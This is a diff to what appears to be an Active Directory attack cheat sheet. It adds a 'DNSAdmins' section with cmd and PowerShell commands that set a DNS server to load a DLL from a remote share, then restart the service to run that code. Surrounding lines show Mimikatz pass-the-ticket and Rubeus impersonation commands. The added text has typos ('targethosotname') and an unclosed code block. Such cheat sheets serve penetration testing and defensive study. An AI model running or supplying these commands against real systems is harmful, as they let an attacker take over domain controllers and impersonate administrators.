@@ -786,6 +786,28 @@ Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
 .\Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:Administrator /msdsspn:"CIFS/<domain>" /ptt
 ```
 
+### DNSAdmins
+**1. With DNS RSAT:**
+```cmd
+# addd the library from a shared folder to the targethostname
+dnscmd targethostname /config /serverlevelplugindll \\IP\share\library.dll
+# restart DNS service on targethostname
+sc \\targethosotname stop dns
+sc \\targethosotname start dns
+```
+
+**2. With Powershell (and DNS RSAT):**
+```powershell
+# Get current DNS settings
+$dnsettings = Get-DnsServerSetting -ComputerName targethostname -Verbose -All
+# Add the Dll to the settings
+$dnsettings.ServerLevelPluginDll = "\\IP\share\library.dll"
+# apply new settings
+Set-DnsServerSetting -InputObject $dnsettings -ComputerName targethostname -Verbose
+# Restart service
+sc.exe \\targethosotname stop dns
+sc.exe \\targethosotname start dns
+
 ### Child to Parent using Trust Tickets
 
 **1. Look for [In] trust key from child to parent:**
